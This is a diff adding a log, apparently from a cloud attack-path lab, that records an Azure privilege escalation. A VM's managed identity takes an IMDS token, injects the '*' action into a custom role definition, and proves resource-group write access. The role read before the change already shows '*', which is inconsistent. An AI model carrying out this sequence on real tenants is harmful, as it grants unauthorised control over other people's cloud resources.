@@ -1,0 +1,49 @@
+[*] target VM:                <VM_PUBLIC_IP>
+[*] foothold:                 VM System-Assigned MI on RG 'pathtriage-rg'
+[*] MI principalId:           <MI_PRINCIPAL_ID>
+[*] target custom role:       <TARGET_ROLE_NAME>
+[*] MI holds two custom roles: 'App Operator' (read-only) and
+    'Custom Role Manager' (roleDefinitions/write only)
+[*] acting from the VM itself (no external attacker host required)
+
+[*] Step 1: query IMDS for Managed Identity token (ARM-scoped)
+[+] MI ARM token acquired
+    token length:             2055 chars
+    resource:                 https://management.azure.com/
+
+[*] Step 2: GET role definition '<TARGET_ROLE_DEF_ID>'
+[+] role retrieved
+    role name:                <TARGET_ROLE_NAME>
+    actions (1):
+      - *
+
+[*] Step 3: PUT role definition with wildcard action injected
+[+] role definition mutated
+    new actions:              ['*']
+    (every assignee of this role is now Owner-equivalent)
+
+[*] Step 4: GET role definition '<TARGET_ROLE_DEF_ID>'
+[+] role retrieved
+    role name:                <TARGET_ROLE_NAME>
+    actions (1):
+      - *
+
+[*] Step 4.5: re-acquire MI token AFTER role mutation
+    (mutated role permissions do not propagate to existing tokens;
+     a fresh IMDS token is required to exercise the new authority)
+[*] Step 1: query IMDS for Managed Identity token (ARM-scoped)
+[+] MI ARM token acquired
+    token length:             2055 chars
+    resource:                 https://management.azure.com/
+
+[*] Step 5: PATCH tag on RG using the upgraded role (write proof)
+    baseline App Operator had no write actions; success implies the
+    role mutation took effect within the same MI session.
+[+] tag write succeeded
+    tag:                      pathtriage-z4=owned
+    api-version:              2021-04-01  (operation=Merge required)
+
+[+] Path Z4 verified: VM MI (custom role w/ roleDefinitions/write) ->
+                      PUT roleDefinitions injecting '*' into Actions ->
+                      every assignee of the mutated role now Owner-equivalent ->
+                      RG-wide control-plane writes succeed
